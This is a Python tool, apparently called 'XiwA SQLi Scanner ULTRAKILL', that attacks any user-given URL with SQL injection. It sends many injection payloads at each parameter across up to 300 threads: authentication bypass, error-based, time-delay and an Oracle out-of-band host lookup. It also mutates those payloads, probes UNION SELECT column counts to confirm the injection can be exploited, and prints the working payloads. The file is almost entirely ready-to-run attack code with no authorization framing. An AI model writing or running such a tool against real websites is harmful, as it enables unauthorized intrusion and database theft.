import re
import sys
import threading
import queue
import requests

class WebsiteSQLi:
    def __init__(self, url, params=None, threads=50, timeout=10):
        self.url = url
        self.params = params if params else self._extract_params()
        self.threads = threads
        self.timeout = timeout
        self.q = queue.Queue()
        self.vuln = {}
        self.payloads = [
            "'", "\"", "';", "\";", "')", "\")", "' or '1'='1", "\" or \"1\"=\"1", "' or 1=1--", "\" or 1=1--",
            "-- -", "#", "/*", "' OR 1=1#", "' OR 1=1/*", "\" OR 1=1#", "\" OR 1=1/*", "' OR 1=1-- -", "\" OR 1=1-- -",
            "' OR 'a'='a", "admin' --", "' or ''='", "\" or \"\"=\"", "' or 1=1#", "\" or 1=1#", "' or 1=1/*", "\" or 1=1/*",
            "') or ('1'='1'--", "') or ('1'='1'/*", "' OR sleep(5)--", "\" OR sleep(5)--", "'; WAITFOR DELAY '0:0:5'--",
            "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--", "1' OR SLEEP(5)#", "1') OR SLEEP(5)#",
            "1));WAITFOR DELAY '0:0:5'--", "';SELECT pg_sleep(5)--", "';IF(1=1) WAITFOR DELAY '0:0:5'--",
            "'||UTL_INADDR.get_host_address('10.10.10.10')||'", "\"||UTL_INADDR.get_host_address('10.10.10.10')||\"",
            "'||(SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(113),CHAR(122),CHAR(118),CHAR(106),CHAR(118), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)-- -",
            "admin')--", "admin\")--", "') and 1=1--", "\") and 1=1--", "' or sleep(5)#", "\" or sleep(5)#",
        ]
        self.error_regexes = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL.*", r"MySqlClient", r"SQLSTATE", r"Driver.* SQL[^\w]",
            r"SQLException", r"org\.hibernate", r"SQLite/JDBCDriver", r"System\.Data\.SqlClient",
            r"PG::SyntaxError", r"PostgreSQL.*ERROR", r"Unclosed quotation mark after the character string",
            r"quoted string not properly terminated", r"DB2 SQL error", r"sybase", r"Syntax error .* in query expression",
            r"ORA-01756", r"Oracle error", r"ODBC.*Syntax error", r"Incorrect syntax near", r"mysql_fetch_assoc",
            r"System.Data.OleDb.OleDbException", r"Incorrect syntax to use near", r"Microsoft Access Driver", r"Dynamic SQL Error",
            r"DataException", r"SQLITE_ERROR", r"PG::UndefinedTable", r"Warning: sqlite_", r"com.informix.jdbc",
        ]

    def _extract_params(self):
        get_params = {}
        if "?" in self.url:
            pi = self.url.split("?", 1)[1]
            for p in pi.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    get_params[k] = v
        return get_params

    def _make_requests(self, url, params):
        try:
            r = requests.get(url, params=params, timeout=self.timeout, allow_redirects=True)
            return r.text, r.elapsed.total_seconds(), r.status_code
        except Exception as e:
            return "", -1, 0

    def _detect_error(self, resp):
        for r in self.error_regexes:
            if re.search(r, resp, re.IGNORECASE):
                return True
        return False

    def _thread_worker(self):
        import random
        thread_vulns = {}
        while True:
            try:
                k, v, payload = self.q.get(timeout=0.15)
            except queue.Empty:
                break
            original = v
            mutation_payloads = [
                payload,
                payload.upper(),
                payload.lower(),
                payload[::-1],
                payload*2,
                f"{payload}{random.randint(1,9999)}",
                f"{payload}/*{random.choice(['--',';',' or 1=1',' and 1=0'])}*/",
                f"{payload} {random.choice(['OR','AND'])} '1'='1' -- -",
                f"{payload};{random.choice(['WAITFOR DELAY 0:0:5--', 'SLEEP(5)--', 'BENCHMARK(100000000,MD5(1))--', 'PG_SLEEP(5)--'])}"
            ]
            results_here = []
            for payl in mutation_payloads:
                params = self.params.copy()
                params[k] = original + payl
                try:
                    resp, dt, status = self._make_requests(self.url.split("?")[0], params)
                except Exception:
                    continue
                vscore = 0
                if self._detect_error(resp):
                    vscore += 2
                if "syntax" in resp.lower() and "error" in resp.lower():
                    vscore += 2
                if status == 200 and (payl.lower() in resp.lower() or 'sql' in resp.lower()):
                    vscore += 1
                if "mysql" in resp.lower() or "syntax" in resp.lower() or "pgsql" in resp.lower():
                    vscore += 1
                if "you have an error" in resp.lower():
                    vscore += 2
                if resp.lower().count("error") > 2:
                    vscore += 1
                if vscore > 0:
                    results_here.append((payl, vscore, dt, status))
            if results_here:
                with threading.Lock():
                    for (payl, vscore, dt, status) in results_here:
                        self.vuln.setdefault(k, []).append({"payload": payl, "score": vscore, "time": dt, "status": status})
            self.q.task_done()
        
    def scan(self):
        import itertools, random
        for k, v in self.params.items():
            for p in self.payloads:
                mps = [
                    p,
                    p*2,
                    p[::-1],
                    p.upper(),
                    p.lower(),
                    f"{p} OR 1=1 --",
                    f"{p};--",
                    f"{p} {random.choice(['AND','OR'])} 1=1 --",
                    f"' OR 1=1#{p}",
                    f"{p}/*{random.randint(111,999)}*/",
                ]
                for mp in set(mps):
                    self.q.put((k, v, mp))
        threads = []
        for _ in range(self.threads*2):
            t = threading.Thread(target=self._thread_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        self.q.join()
        for t in threads:
            t.join(timeout=7)
        ranked = {}
        for k,v in self.vuln.items():
            if isinstance(v, list) and len(v) and isinstance(v[0], dict):
                ranked[k] = sorted(v, key=lambda d: (-d['score'], d['time']))
            else:
                ranked[k] = v
        self.vuln = ranked
        return self.vuln

    def _union_select_payloads(self, columns=9):
        tokens = ["qzvjv", "xyzabc", "test123", "010101", "||chr(113)||", "0x717a766a76", "concat('q','zvjv')", "1337", "987654"]
        base_payloads = []
        for tok in tokens:
            row = [f"'{tok}'"] + ["null"]*(columns-1)
            p = "' UNION SELECT {}-- -".format(",".join(row))
            base_payloads.append(p)
            row_rev = ["null"]*(columns-1) + [f"'{tok}'"]
            base_payloads.append("' UNION SELECT {}-- -".format(",".join(row_rev)))
        return base_payloads

    def exploit(self, try_columns=range(3,13)):
        if not self.vuln:
            return {}
        extracted = {}
        for k in self.vuln:
            found = False
            for columns in try_columns:
                payls = self._union_select_payloads(columns=columns)[:min(12, columns*2)]
                for payload in payls:
                    params = self.params.copy()
                    params[k] = (params[k] if isinstance(params[k],str) else str(params[k])) + payload
                    try:
                        resp, dt, status = self._make_requests(self.url.split("?")[0], params)
                    except Exception:
                        continue
                    m = re.search(r"qzvjv|xyzabc|test123|010101|1337|987654", resp, re.I)
                    if m:
                        extracted[k] = {'payload': payload, 'found': m.group(0), 'columns': columns}
                        found = True
                        break
                if found:
                    break
        return extracted

    def time_based_check(self):
        import time
        timed = {}
        time_payloads = [
            "';WAITFOR DELAY '0:0:5'--",
            "' OR sleep(5)--",
            "'||pg_sleep(5)--",
            "';SELECT pg_sleep(5)--",
            "' AND SLEEP(5)--",
            "';BENCHMARK(100000000,MD5(1))--",
            "\";WAITFOR DELAY '0:0:5'--",
            "\" OR sleep(5)--"
        ]
        for k, v in self.params.items():
            for tpay in time_payloads:
                params = self.params.copy()
                params[k] = v + tpay
                try:
                    t0 = time.time()
                    resp, dt, status = self._make_requests(self.url.split("?")[0], params)
                    t_delta = time.time() - t0
                    if t_delta > 4.5:
                        timed.setdefault(k, []).append({'payload': tpay, 'delay': round(t_delta,2), 'status': status})
                except Exception:
                    continue
        return timed

    def print_report(self, details=True, show_top=7):
        if not self.vuln:
            print("Aucune vulnérabilité SQLi détectée.")
            input("Continuer...")
            return
        print("Vulnérabilités SQLi détectées sur:", self.url)
        for k, v in self.vuln.items():
            print(f" Paramètre: {k}")
            if details and isinstance(v, list):
                for i,p in enumerate(v[:show_top]):
                    if isinstance(p, dict):
                        print(f"   Injection {i+1}: {p['payload']} | score: {p['score']} | time: {p['time']:.2f} | HTTP: {p['status']}")
                    else:
                        print(f"   Injection {i+1}: {p}")
        exploitable = self.exploit()
        if exploitable:
            print("\nUnion-based SQLi exploitable:")
            for k, info in exploitable.items():
                print(f" Paramètre exploité: {k} | payload: {info['payload']} | trouvé: {info['found']} | colonnes: {info.get('columns','?')}")
        time_vuln = self.time_based_check()
        if time_vuln:
            print("\nPossible SQLi time-based:")
            for k, lst in time_vuln.items():
                for info in lst:
                    print(f" Paramètre: {k} | payload: {info['payload']} | délai: {info['delay']}s | HTTP: {info['status']}")
        input("Continuer...")

def main():
    print("=== XiwA SQLi Scanner ULTRAKILL ===")
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input("URL cible (GET, ex: http://site.com/page.php?id=1&cat=foo): ").strip()
    scanner = WebsiteSQLi(url, threads=150)
    print("Scan SQLi en cours...")
    vuln = scanner.scan()
    scanner.print_report(details=True, show_top=12)
    input("Continuer...")

if __name__ == "__main__":
    main()